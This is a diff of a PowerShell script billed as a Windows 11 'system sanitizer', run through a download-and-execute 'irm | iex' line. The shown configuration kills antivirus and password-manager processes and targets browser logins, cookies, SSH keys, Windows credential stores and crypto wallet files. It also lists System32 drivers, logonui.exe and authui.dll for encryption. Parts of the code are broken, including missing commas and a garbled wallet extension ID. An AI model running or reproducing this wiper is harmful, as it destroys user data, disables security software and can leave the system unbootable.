@@ -1,11 +1,11 @@
-# ULTIMATE SECURE WINDOWS 11 SYSTEM WIPER
-# Professional-grade secure data erasure for Windows 11
+# COMPREHENSIVE WINDOWS 11 SYSTEM SANITIZER
+# Professional-grade secure data erasure with system protection
 # Execute with: irm "https://raw.githubusercontent.com/Mestalic/SystemWiper/refs/heads/main/code/Invoke-UltimateSecureEraser.ps1" | iex
 
 param(
     [Parameter(Mandatory=$false)]
     [ValidateRange(1,10)]
-    [int]$EncryptionRounds = 3,
+    [int]$EncryptionRounds = 7,
     
     [Parameter(Mandatory=$false)]
     [switch]$Verify,
@@ -24,27 +24,62 @@ param(
 )
 
 # ========================================
-# GLOBAL CONFIGURATION & SETTINGS
+# SYSTEM PROTECTION AND CONFIGURATION
 # ========================================
 
 $Global:Config = @{
     # Security Settings
     MinKeySize = 256
-    DefaultRounds = 3
+    DefaultRounds = 7
     MaxRounds = 10
-    NuclearModeRounds = 7
-    FastModeRounds = 1
+    NuclearModeRounds = 10
+    FastModeRounds = 3
     
     # Performance Settings
     MaxParallelJobs = [Environment]::ProcessorCount * 2
     ChunkSize = 4MB
-    BufferSize = 128KB
-    ProcessKillTimeout = 10
-    FastMode = $true
+    BufferSize = 256KB
+    ProcessKillTimeout = 5
     
-    # Aggressive System Targets - ALL major data locations
+    # PROTECTED SYSTEM PROCESSES (NEVER KILL)
+    ProtectedProcesses = @(
+        "wininit", "winlogon", "csrss", "smss", "lsass", "lsm", "svchost",
+        "rundll32", "taskhost", "taskhostw", "audiodg", "dwm", "fontdrvhost",
+        "WUDFHost", "spoolsv", "services", "lsm", "lsmore", "system", "registry"
+    )
+    
+    # SAFE TO KILL PROCESSES (User applications)
+    KillableProcesses = @(
+        # Browsers
+        "chrome", "msedge", "firefox", "opera", "brave", "vivaldi", "tor", "torbrowser",
+        # Gaming
+        "steam", "epicgameslauncher", "battlenet", "origin", "uplay", "galaxyclient", "xboxapp", "uplay", "uplayubimax",
+        # Communication
+        "discord", "teams", "slack", "zoom", "skype", "telegram", "whatsapp", "signal", "viber",
+        # Development
+        "code", "atom", "notepad++", "sublime", "jetbrains", "visualstudio", "visualstudioenterprise", "devenv", "docker", "dockerdesktop", "clion", "pycharm", "webstorm", "phpstorm", "intellij", "rider",
+        # Media
+        "spotify", "netflix", "hulu", "primevideo", "vlc", "media player", "itunes", "quicktime", "windows media player", "groove", "photos", "photoshop", "lightroom", "gimp", "blender", "autocad", "3ds max", "maya",
+        # File managers
+        "winrar", "7zip", "winzip", "dropbox", "onedrive", "google drive", "mega sync", "box", "box drive",
+        # VPN/Security
+        "nordvpn", "expressvpn", "cyberghost", "protonvpn", "surfshark", "mullvad", "ipvanish", "tunnelbear", "bitdefender", "kaspersky", "norton", "mcafee", "eset", "avg", "avast", "panda", "f-secure", "trend micro", "avira",
+        # Remote access
+        "teamviewer", "anydesk", "rdp", "mstsc", "rdpwrap", "vnc", "tightvnc", "ultravnc", "remote desktop", "nomachine",
+        # Office/Productivity
+        "winword", "excel", "powerpoint", "outlook", "onenote", "publisher", "access", "visio", "project", "skype for business", "lync", "office", "office 365", "google docs", "google sheets", "google slides", "dropbox", "notion", "slack", "microsoft teams", "zoom", "bluejeans", "gotomeeting", "webex",
+        # Email clients
+        "outlook", "thunderbird", "eudora", "claws mail", "evolution", "kmail", "mail", "mailbird", "em client", "postbox", "paragon", "mailplane", "thunder",
+        # Password managers
+        "bitwarden", "1password", "lastpass", "dashlane", "keeper", "roboform", "truekey", "enpass", "password safe", "KeePass", "keepassxc", "password fox",
+        # Cryptocurrency
+        "bitcoin core", "ethereum wallet", "metamask", "coinbase", "binance", "kraken", "coinbase pro", "gemini", "blockchain", "electrum", "armory", "mycelium", "trezor", "ledger live", "meta mask", "opera crypto", "brave crypto", "coinbase pro", "binance us", "kraken pro", "gemini", "bithumb", "huobi", "okex", "bybit", "coinmama", "cex.io", "cointrader", "crypto news", "crypto.com", "revolut", "revolut crypto", "blockchain.com", "coinbase.com", "metamask.io", "trezor.com", "ledger.com"
+    )
+    
+    # COMPREHENSIVE BROWSER TARGETS
     BrowserTargets = @{
         Chromium = @(
+            # Chrome
             "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\*.sqlite",
             "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\*.ldb",
             "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\*.log",
@@ -53,32 +88,97 @@ $Global:Config = @{
             "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Current Tabs",
             "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Last Session",
             "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Last Tabs",
+            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Login Data*",
+            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Cookies*",
+            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Web Data*",
+            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Local Storage*",
+            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Session Storage*",
+            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Local State*",
+            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Preferences*",
+            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Bookmarks*",
+            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Extensions\*",
+            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Sync Data\*",
+            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Cache\*",
+            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Network\*",
+            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\GPUCache\*",
+            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Media Cache\*",
+            
+            # Edge
             "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\*.sqlite",
             "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\*.ldb",
             "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\*.log",
+            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\Login Data*",
+            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\Cookies*",
+            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\Web Data*",
+            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\Local State*",
+            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\Local Storage*",
+            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\Session Storage*",
+            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\Preferences*",
+            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\Bookmarks*",
+            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\Cache\*",
+            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\Network\*",
+            
+            # Brave
             "${env:LOCALAPPDATA}\BraveSoftware\Brave-Browser\User Data\*\Default\*\*.sqlite",
             "${env:LOCALAPPDATA}\BraveSoftware\Brave-Browser\User Data\*\Default\*\*.ldb",
+            "${env:LOCALAPPDATA}\BraveSoftware\Brave-Browser\User Data\*\Default\*\Login Data*",
+            "${env:LOCALAPPDATA}\BraveSoftware\Brave-Browser\User Data\*\Default\*\Cookies*",
+            "${env:LOCALAPPDATA}\BraveSoftware\Brave-Browser\User Data\*\Default\*\Web Data*",
+            "${env:LOCALAPPDATA}\BraveSoftware\Brave-Browser\User Data\*\Default\*\Local State*",
+            
+            # Opera
             "${env:LOCALAPPDATA}\Opera Software\Opera Stable\*\Default\*\*.sqlite",
             "${env:LOCALAPPDATA}\Opera Software\Opera Stable\*\Default\*\*.ldb",
+            "${env:LOCALAPPDATA}\Opera Software\Opera Stable\*\Default\*\Login Data*",
+            "${env:LOCALAPPDATA}\Opera Software\Opera Stable\*\Default\*\Cookies*",
+            "${env:LOCALAPPDATA}\Opera Software\Opera Stable\*\Default\*\Web Data*",
+            
+            # Vivaldi
             "${env:LOCALAPPDATA}\Vivaldi\User Data\*\Default\*\*.sqlite",
-            "${env:LOCALAPPDATA}\Vivaldi\User Data\*\Default\*\*.ldb"
+            "${env:LOCALAPPDATA}\Vivaldi\User Data\*\Default\*\*.ldb",
+            "${env:LOCALAPPDATA}\Vivaldi\User Data\*\Default\*\Login Data*",
+            "${env:LOCALAPPDATA}\Vivaldi\User Data\*\Default\*\Cookies*",
+            "${env:LOCALAPPDATA}\Vivaldi\User Data\*\Default\*\Web Data*"
         )
         Firefox = @(
             "${env:APPDATA}\Mozilla\Firefox\Profiles\*\*.sqlite",
             "${env:APPDATA}\Mozilla\Firefox\Profiles\*\*.db",
+            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\logins.json",
+            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\key*.db",
+            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\cookies.sqlite",
+            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\formhistory.sqlite",
+            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\places.sqlite",
             "${env:APPDATA}\Mozilla\Firefox\Profiles\*\sessionstore*",
             "${env:APPDATA}\Mozilla\Firefox\Profiles\*\sessionrestore*",
-            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\formhistory*",
             "${env:APPDATA}\Mozilla\Firefox\Profiles\*\bookmarks*",
-            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\downloads*"
+            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\downloads*",
+            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\prefs.js",
+            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\user.js"
         )
         Tor = @(
             "${env:LOCALAPPDATA}\TorBrowser\Tor\*\*.sqlite",
-            "${env:LOCALAPPDATA}\TorBrowser\Tor\*\*.db"
+            "${env:LOCALAPPDATA}\TorBrowser\Tor\*\*.db",
+            "${env:LOCALAPPDATA}\TorBrowser\Tor\*\logins.json",
+            "${env:LOCALAPPDATA}\TorBrowser\Tor\*\key*.db",
+            "${env:LOCALAPPDATA}\TorBrowser\Tor\*\cookies.sqlite"
+        )
+        Additional = @(
+            # Internet Explorer
+            "${env:LOCALAPPDATA}\Microsoft\Windows\WebCache\Cache\*",
+            "${env:USERPROFILE}\AppData\Local\Microsoft\Windows\WebCache\Cache\*",
+            "${env:LOCALAPPDATA}\Microsoft\Windows\INetCache\Content.Outlook\*",
+            
+            # Seamonkey
+            "${env:APPDATA}\Mozilla\seamonkey\profiles\*\*.sqlite",
+            "${env:APPDATA}\Mozilla\seamonkey\profiles\*\*.db",
+            
+            # Flock
+            "${env:APPDATA}\Mozilla\Flock\profiles\*\*.sqlite",
+            "${env:APPDATA}\Mozilla\Flock\profiles\*\*.db"
         )
     }
     
-    # ALL Gaming Platforms
+    # ALL GAMING PLATFORMS
     GamingTargets = @(
         # Steam
         "${env:PROGRAMFILES(X86)}\Steam\config\*.vdf",
@@ -86,41 +186,75 @@ $Global:Config = @{
         "${env:APPDATA}\Steam\ssfn*",
         "${env:APPDATA}\Steam\ssfn*",
         "${env:USERPROFILE}\Documents\My Games\Steam\*\config\*",
+        "${env:APPDATA}\Steam\logfiles\*",
+        "${env:USERPROFILE}\Documents\My Games\Steam\config\config.vdf",
         
         # Epic Games Launcher
         "${env:LOCALAPPDATA}\EpicGamesLauncher\Saved\*\*.log",
         "${env:LOCALAPPDATA}\EpicGamesLauncher\Saved\*\*.cfg",
         "${env:LOCALAPPDATA}\EpicGamesLauncher\Saved\Logs\*",
         "${env:LOCALAPPDATA}\EpicGamesLauncher\Saved\Config\Windows\*",
+        "${env:LOCALAPPDATA}\EpicGamesLauncher\service\*.log",
         
         # Battle.net
         "${env:LOCALAPPDATA}\Battle.net\*.xml",
         "${env:LOCALAPPDATA}\Battle.net\config\*.xml",
         "${env:USERPROFILE}\Documents\Battle.net\*",
+        "${env:USERPROFILE}\AppData\Roaming\Battle.net\*.xml",
         
         # Origin
         "${env:APPDATA}\Origin\local_storage\*",
         "${env:APPDATA}\Origin\session_storage\*",
         "${env:APPDATA}\Origin\*.db",
+        "${env:APPDATA}\Origin\origin-profiles.json",
         
         # Ubisoft Connect
         "${env:APPDATA}\UbisoftConnect\*",
         "${env:APPDATA}\UbisoftGameLauncher\*",
         "${env:APPDATA}\UbisoftConnect\session_storage\*",
+        "${env:APPDATA}\UbisoftGameLauncher\service\*.log",
         
         # GOG Galaxy
         "${env:APPDATA}\GOG.com\Galaxy\storage\*",
+        "${env:APPDATA}\GOG.com\Galaxy\service\*.log",
+        "${env:APPDATA}\GOG.com\Galaxy\user_settings.json",
         
         # Xbox Game Pass
         "${env:LOCALAPPDATA}\Microsoft\XblAuthManager\*",
         "${env:LOCALAPPDATA}\Microsoft\XblGameSave\*",
+        "${env:APPDATA}\Microsoft\XboxLiveAuthManager\*",
         
         # Minecraft
         "${env:APPDATA}\.minecraft\saves\*",
-        "${env:USERPROFILE}\AppData\Roaming\.minecraft\launcher_accounts.json"
+        "${env:USERPROFILE}\AppData\Roaming\.minecraft\launcher_accounts.json",
+        "${env:APPDATA}\.minecraft\config\*",
+        
+        # League of Legends
+        "${env:APPDATA}\League of Legends\*",
+        "${env:LOCALAPPDATA}\Riot Games\*",
+        "${env:USERPROFILE}\AppData\Roaming\Riot Games\*",
+        
+        # Valorant
+        "${env:LOCALAPPDATA}\VALORANT\*",
+        "${env:USERPROFILE}\AppData\Roaming\Riot Games\RiotClientServices\credentials*",
+        
+        # Overwatch
+        "${env:USERPROFILE}\Documents\Overwatch\settings\*",
+        
+        # World of Warcraft
+        "${env:USERPROFILE}\Documents\World of Warcraft\*",
+        
+        # Counter-Strike 2
+        "${env:USERPROFILE}\Documents\my games\*",
+        
+        # Grand Theft Auto V
+        "${env:USERPROFILE}\Documents\Rockstar Games\GTA V\Profiles\*",
+        
+        # Bethesda games
+        "${env:USERPROFILE}\Documents\My Games\*"
     )
     
-    # ALL Communication Apps
+    # ALL COMMUNICATION APPS
     CommunicationTargets = @(
         # Discord
         "${env:APPDATA}\Discord\*\Local Storage\leveldb\*",
@@ -129,32 +263,71 @@ $Global:Config = @{
         "${env:APPDATA}\discord*\modules\*\discord_desktop_core-*\*",
         "${env:APPDATA}\Discord\*\*.ldb",
         "${env:APPDATA}\Discord\*\*.log",
+        "${env:APPDATA}\Discord\*\config\settings.json",
         
         # Microsoft Teams
         "${env:LOCALAPPDATA}\Microsoft\Teams\Local Storage\*",
         "${env:APPDATA}\Microsoft\Teams\logs\*",
         "${env:APPDATA}\Microsoft\Teams\Storage\*",
         "${env:LOCALAPPDATA}\Microsoft\Teams\Service Worker\CacheStorage\*",
+        "${env:LOCALAPPDATA}\Microsoft\Teams\settings.json",
         
         # Slack
         "${env:APPDATA}\Slack\Local Storage\*",
         "${env:APPDATA}\Slack\session_storage\*",
         "${env:APPDATA}\Slack\*.db",
+        "${env:APPDATA}\Slack\app-*\local_storage\leveldb\*",
         
         # Zoom
         "${env:APPDATA}\Zoom\*\s3:\*",
         "${env:APPDATA}\Zoom\*\web*\Cache\*",
+        "${env:APPDATA}\Zoom\*\config\*",
         
         # Skype
         "${env:APPDATA}\Microsoft\Skype\*\Logs\*",
         "${env:APPDATA}\Microsoft\Skype\*\Media\*",
+        "${env:APPDATA}\Microsoft\Skype\*\AppData\Roaming\Skype\*\config.json",
         
         # Telegram
         "${env:APPDATA}\Telegram Desktop\tdata\user_data\*\Cache\*",
-        "${env:APPDATA}\Telegram Desktop\tdata\user_data\*\Local Storage\*"
+        "${env:APPDATA}\Telegram Desktop\tdata\user_data\*\Local Storage\*",
+        "${env:APPDATA}\Telegram Desktop\tdata\settings.json",
+        
+        # WhatsApp Desktop
+        "${env:APPDATA}\WhatsApp\*\Cache\*",
+        "${env:APPDATA}\WhatsApp\*\Local Storage\*",
+        
+        # Signal
+        "${env:APPDATA}\Signal\data\*",
+        "${env:APPDATA}\Signal\config.json",
+        
+        # Viber
+        "${env:USERPROFILE}\AppData\Roaming\Viber\*",
+        
+        # WeChat
+        "${env:USERPROFILE}\AppData\Roaming\Tencent\WeChat\*\AppData\Roaming\Tencent\WeChat\*\Data\MsgStore\*",
+        
+        # QQ
+        "${env:USERPROFILE}\AppData\Roaming\Tencent\QQ\*",
+        
+        # Line
+        "${env:USERPROFILE}\AppData\Roaming\Line\app-*\Cache\*",
+        
+        # Facebook Messenger
+        "${env:USERPROFILE}\AppData\Roaming\Facebook\Messenger\Cache\*",
+        
+        # Microsoft Outlook
+        "${env:APPDATA}\Microsoft\Outlook\*.OST",
+        "${env:APPDATA}\Microsoft\Outlook\*.PST",
+        "${env:LOCALAPPDATA}\Microsoft\Outlook\cache\*",
+        
+        # Thunderbird
+        "${env:APPDATA}\Thunderbird\Profiles\*\*.sqlite",
+        "${env:APPDATA}\Thunderbird\Profiles\*\abook.sqlite",
+        "${env:APPDATA}\Thunderbird\Profiles\*\prefs.js"
     )
     
-    # ALL Streaming/Media Apps
+    # ALL STREAMING/MEDIA APPS
     StreamingTargets = @(
         # Spotify
         "${env:APPDATA}\Spotify\data\*",
@@ -162,6 +335,7 @@ $Global:Config = @{
         "${env:APPDATA}\Spotify\session_storage\*",
         "${env:APPDATA}\Spotify\Cache\*",
         "${env:APPDATA}\Spotify\local_storage\*",
+        "${env:APPDATA}\Spotify\prefs.json",
         
         # Netflix
         "${env:LOCALAPPDATA}\Netflix\Local Storage\*",
@@ -175,10 +349,26 @@ $Global:Config = @{
         "${env:LOCALAPPDATA}\Hulu\Cache\*",
         
         # Amazon Prime Video
-        "${env:LOCALAPPDATA}\Amazon Video\Cache\*"
+        "${env:LOCALAPPDATA}\Amazon Video\Cache\*",
+        
+        # Disney Plus
+        "${env:LOCALAPPDATA}\DisneyPlus\Cache\*",
+        
+        # HBO Max
+        "${env:LOCALAPPDATA}\HBO Max\Cache\*",
+        
+        # Twitch
+        "${env:APPDATA}\Twitch\Cache\*",
+        "${env:APPDATA}\Twitch\Local Storage\*",
+        
+        # Steam Broadcasting
+        "${env:APPDATA}\Steam\broadcasting\*",
+        
+        # Discord Streaming
+        "${env:APPDATA}\Discord\Cache\*"
     )
     
-    # ALL Development Tools
+    # ALL DEVELOPMENT TOOLS
     DevTargets = @(
         # Git
         "${env:LOCALAPPDATA}\Programs\Git\etc\ssh\ssh_host_*",
@@ -188,11 +378,13 @@ $Global:Config = @{
         "${env:LOCALAPPDATA}\GitCredentialManager\*.json",
         "${env:APPDATA}\GitCredentialManager\*.json",
         "${env:USERPROFILE}\.ssh\*",
+        "${env:LOCALAPPDATA}\Programs\Git\etc\ssh\ssh_config",
         
         # GitHub/GitLab
         "${env:LOCALAPPDATA}\GitHubDesktop\Cache\*",
         "${env:APPDATA}\GitCredentialManager\*.json",
         "${env:APPDATA}\GitCredentialManager\*.db",
+        "${env:LOCALAPPDATA}\Programs\GitHub\app-*\app-*\resources\app\app-\tools\ssh\known_hosts",
         
         # VS Code
         "${env:APPDATA}\Code\User\keybindings.json",
@@ -200,24 +392,88 @@ $Global:Config = @{
         "${env:APPDATA}\Code\User\snippets\*",
         "${env:APPDATA}\Code\User\workspaceStorage\*",
         "${env:APPDATA}\Code\User\Local Storage\*",
+        "${env:APPDATA}\Code\Cache\*",
         
         # Visual Studio
         "${env:APPDATA}\Microsoft\VisualStudio\*\ComponentModelCache\*",
         "${env:APPDATA}\Microsoft\VisualStudio\*\MEFCache\*",
+        "${env:APPDATA}\Microsoft\VisualStudio\*\WebSiteCache\*",
+        "${env:USERPROFILE}\AppData\Roaming\Microsoft\VisualStudio\*\web.config",
         
         # Docker
         "${env:USERPROFILE}\.docker\*.json",
         "${env:USERPROFILE}\.docker\config.json",
+        "${env:APPDATA}\Docker\*.json",
         
         # JetBrains IDEs
         "${env:APPDATA}\JetBrains\*\options\*",
         "${env:APPDATA}\JetBrains\*\scratches\*",
+        "${env:APPDATA}\JetBrains\*\keymaps\*",
+        "${env:APPDATA}\JetBrains\*\filetypes\*",
+        "${env:APPDATA}\JetBrains\*\colors\*",
+        "${env:APPDATA}\JetBrains\*\keymaps\*",
+        
+        # PyCharm
+        "${env:APPDATA}\JetBrains\PyCharm*\options\keymap.xml",
+        "${env:APPDATA}\JetBrains\PyCharm*\options\fileColors.xml",
         
         # Sublime Text
-        "${env:APPDATA}\Sublime Text 3\Local Storage\*"
+        "${env:APPDATA}\Sublime Text 3\Local Storage\*",
+        "${env:APPDATA}\Sublime Text 3\Packages\*",
+        
+        # Atom
+        "${env:USERPROFILE}\.atom\config.cson",
+        "${env:USERPROFILE}\.atom\snippets.cson",
+        "${env:USERPROFILE}\.atom\packages\*",
+        
+        # Notepad++
+        "${env:USERPROFILE}\AppData\Roaming\Notepad++\config.xml",
+        "${env:USERPROFILE}\AppData\Roaming\Notepad++\shortcuts.xml",
+        
+        # Adobe Creative Suite
+        "${env:APPDATA}\Adobe\Adobe Photoshop *\Adobe Photoshop * Settings\*",
+        "${env:APPDATA}\Adobe\Adobe Illustrator *\Adobe Illustrator * Settings\*",
+        "${env:APPDATA}\Adobe\Adobe Premiere Pro *\Adobe Premiere Pro * Settings\*",
+        "${env:APPDATA}\Adobe\Adobe After Effects *\Adobe After Effects * Settings\*",
+        "${env:APPDATA}\Adobe\Adobe Audition *\Adobe Audition * Settings\*",
+        
+        # CAD Software
+        "${env:USERPROFILE}\AppData\Roaming\Autodesk\AutoCAD \*",
+        "${env:USERPROFILE}\AppData\Roaming\Autodesk\Revit \*",
+        "${env:USERPROFILE}\Documents\Autodesk\Revit \*",
+        
+        # 3D Software
+        "${env:USERPROFILE}\AppData\Roaming\Autodesk\3dsMax \*",
+        "${env:USERPROFILE}\Documents\3dsMax \[Documents\] Autodesk 3dsMax \*",
+        "${env:USERPROFILE}\AppData\Roaming\Blender Foundation\Blender\*\config\*",
+        "${env:USERPROFILE}\AppData\Roaming\Autodesk\Maya \*"
     )
     
-    # ALL Windows System Locations
+    # ALL CRYPTOCURRENCY/WALLET APPS
+    CryptoTargets = @(
+        # Bitcoin Core
+        "${env:USERPROFILE}\AppData\Roaming\Bitcoin\wallet.dat",
+        "${env:USERPROFILE}\AppData\Roaming\Bitcoin\peers.dat",
+        "${env:USERPROFILE}\AppData\Roaming\Bitcoin\mempool.dat",
+        
+        # Ethereum Wallet
+        "${env:USERPROFILE}\AppData\Roaming\Ethereum Wallet\*\wallet.json",
+        "${env:USERPROFILE}\AppData\Roaming\Ethereum Wallet\*\key\*",
+        
+        # MetaMask
+        "${env:USERPROFILE}\AppData\Local\Google\Chrome\User Data\*\Default\Local Extension Settings\*\bpiocbgkbdus"
+        
+        # Binance
+        "${env:USERPROFILE}\AppData\Roaming\Binance\app-*\Configuration\config.json"
+        
+        # Coinbase Pro
+        "${env:USERPROFILE}\AppData\Roaming\Coinbase Pro\*.json"
+        
+        # Ledger Live
+        "${env:USERPROFILE}\AppData\Roaming\Ledger Live\storage\*.json"
+    )
+    
+    # COMPREHENSIVE WINDOWS SYSTEM TARGETS
     SystemTargets = @{
         Credentials = @(
             "${env:APPDATA}\Microsoft\Credentials\*",
@@ -225,19 +481,27 @@ $Global:Config = @{
             "${env:APPDATA}\Microsoft\SystemCertificates\*",
             "${env:PROGRAMDATA}\Microsoft\Credentials\*",
             "${env:PROGRAMDATA}\Microsoft\Protect\*",
-            "${env:PROGRAMDATA}\Microsoft\SystemCertificates\*"
+            "${env:PROGRAMDATA}\Microsoft\SystemCertificates\*",
+            "${env:USERPROFILE}\AppData\Roaming\Microsoft\Credentials\*",
+            "${env:USERPROFILE}\AppData\Roaming\Microsoft\Protect\*"
         )
         WindowsHello = @(
             "${env:LOCALAPPDATA}\Microsoft\Biometrics\*",
-            "${env:PROGRAMDATA}\Microsoft\Biometrics\*"
+            "${env:PROGRAMDATA}\Microsoft\Biometrics\*",
+            "${env:USERPROFILE}\AppData\Roaming\Microsoft\Biometrics\*"
         )
         OneDrive = @(
             "${env:APPDATA}\Microsoft\OneDrive\logs\*",
             "${env:APPDATA}\Microsoft\OneDrive\setup\*",
-            "${env:APPDATA}\Microsoft\OneDrive\tokens\*"
+            "${env:APPDATA}\Microsoft\OneDrive\tokens\*",
+            "${env:USERPROFILE}\AppData\Roaming\Microsoft\OneDrive\logs\*"
         )
-        WindowsLogs = @(
-            "${env:SystemRoot}\System32\winevt\Logs\*.evtx"
+        UserProfiles = @(
+            "${env:USERPROFILE}\AppData\Roaming\*\*.db",
+            "${env:USERPROFILE}\AppData\Roaming\*\config.json",
+            "${env:USERPROFILE}\AppData\Roaming\*\settings.json",
+            "${env:USERPROFILE}\AppData\Roaming\*\*.key",
+            "${env:USERPROFILE}\AppData\Roaming\*\*.secret"
         )
         TempFiles = @(
             "${env:TEMP}\*",
@@ -247,68 +511,85 @@ $Global:Config = @{
         )
     }
     
-    # Deep System Locations
-    DeepTargets = @(
-        # Registry hive user data
+    # SYSTEM FILES FOR ENCRYPTION (when deletion is impossible)
+    SystemFilesForEncryption = @(
+        "${env:SystemRoot}\System32\drivers\*",
+        "${env:SystemRoot}\System32\sapi.dll",
+        "${env:SystemRoot}\System32\authui.dll",
+        "${env:SystemRoot}\System32\logonui.exe",
+        "${env:SystemRoot}\System32\credwiz.exe",
+        "${env:SystemRoot}\System32\msusec.exe",
         "${env:USERPROFILE}\NTUSER.DAT",
-        "${env:USERPROFILE}\AppData\Local\Microsoft\Windows\UserAccountControlExperience\*",
-        
-        # System restore points (if not disabled)
-        "${env:SystemRoot}\System Volume Information\*",
-        
-        # Application data deep locations
-        "${env:USERPROFILE}\AppData\*\localstorage\*",
-        "${env:USERPROFILE}\AppData\*\sessionstorage\*",
-        "${env:USERPROFILE}\AppData\*\*.ldb",
-        "${env:USERPROFILE}\AppData\*\*.sqlite",
-        "${env:USERPROFILE}\AppData\*\Cache\*",
-        
-        # Download directories
-        "${env:USERPROFILE}\Downloads\*",
-        "${env:USERPROFILE}\Documents\*",
-        "${env:USERPROFILE}\Pictures\*",
-        "${env:USERPROFILE}\Videos\*"
+        "${env:USERPROFILE}\AppData\Local\Microsoft\Windows\UserAccountControlExperience\*"
     )
     
-    # Registry Targets - COMPREHENSIVE
+    # REGISTRY TARGETS - COMPREHENSIVE
     RegistryTargets = @(
+        # Browser registry entries
         "HKCU:\Software\Google\Chrome\PreferenceMACs\*",
         "HKCU:\Software\Microsoft\Edge\PreferenceMACs\*",
         "HKCU:\Software\Mozilla\Firefox\*",
-        "HKCU:\Software\Discord\*",
+        "HKCU:\Software\Opera Software\Opera\*",
+        "HKCU:\Software\BraveSoftware\Brave-Browser\*",
+        "HKCU:\Software\Vivaldi\*",
+        
+        # Gaming registry entries
         "HKCU:\Software\Valve\Steam\*",
         "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam\*",
         "HKLM:\SOFTWARE\WOW6432Node\Battle.net\*",
+        "HKCU:\Software\Epic Games\Epic Games Launcher\*",
+        "HKLM:\SOFTWARE\Ubisoft Connect\*",
+        "HKCU:\Software\Ubisoft Connect\*",
+        
+        # Communication registry entries
+        "HKCU:\Software\Discord\*",
+        "HKCU:\Software\Slack Technologies\*",
+        "HKCU:\Software\Microsoft\Teams\*",
+        "HKCU:\Software\Zoom\*",
+        "HKCU:\Software\Microsoft\Skype\*",
+        "HKCU:\Software\TelegramDesktop\*",
+        "HKCU:\Software\WhatsApp\*",
+        "HKCU:\Software\Signal Messenger\*",
+        
+        # Development registry entries
+        "HKCU:\Software\Microsoft\VSCode\*",
+        "HKCU:\Software\Microsoft\VisualStudio\*",
+        "HKCU:\Software\JetBrains\*",
+        "HKCU:\Software\GitHub\GitHub Desktop\*",
+        "HKCU:\Software\GitHubDesktop\*",
+        "HKCU:\Software\Git\*",
+        "HKCU:\Software\Microsoft\Docker\Toolbox\*",
+        "HKCU:\Software\Adobe\*",
+        "HKCU:\Software\Autodesk\*",
+        
+        # System registry entries
         "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
         "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs",
         "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths",
         "HKCU:\Software\Microsoft\Internet Explorer\TypedURLs",
         "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones",
         "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cache",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Cache\*",
+        
+        # Office/Productivity registry entries
         "HKCU:\Software\Microsoft\Office\*\Common\Internet",
-        "HKCU:\Software\Adobe\*\Acrobat\*\Trust Manager",
-        "HKCU:\Software\Microsoft\VisualStudio\*\Authentication",
-        "HKCU:\Software\GitHubDesktop\*"
-    )
-    
-    # Process Killer - ALL common processes
-    ProcessPatterns = @(
-        # Browsers
-        "chrome", "msedge", "firefox", "opera", "brave", "vivaldi", "tor", "torbrowser",
-        # Gaming
-        "steam", "epicgameslauncher", "battlenet", "origin", "uplay", "galaxyclient", "xboxapp",
-        # Communication
-        "discord", "teams", "slack", "zoom", "skype", "telegram", "whatsapp",
-        # Development
-        "code", "atom", "notepad++", "sublime", "jetbrains", "visualstudio", "docker",
-        # Media
-        "spotify", "netflix", "hulu", "primevideo", "vlc", "media player",
-        # File managers
-        "winrar", "7zip", "dropbox", "onedrive",
-        # VPN/Security
-        "nordvpn", "expressvpn", "cyberghost", "protonvpn",
-        # Remote access
-        "teamviewer", "anydesk", "rdp", "mstsc"
